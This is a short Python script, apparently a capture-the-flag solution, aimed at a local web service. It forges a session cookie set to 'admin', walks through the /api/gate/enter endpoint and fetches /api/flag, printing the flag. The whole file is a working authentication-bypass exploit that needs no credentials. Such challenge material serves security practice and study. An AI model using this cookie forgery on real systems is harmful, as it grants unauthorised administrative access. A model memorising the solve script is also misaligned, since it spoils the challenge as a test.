import sys
from urllib.parse import urlparse

import requests

base_url = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:18080"
hostname = urlparse(base_url).hostname

session = requests.Session()
session.cookies.set("session", "admin", domain=hostname, path="/")

response = session.get(f"{base_url}/api/me")
response.raise_for_status()

response = session.post(f"{base_url}/api/gate/enter", json={})
response.raise_for_status()

response = session.post(f"{base_url}/api/flag", json={})
response.raise_for_status()

print(response.json()["flag"])
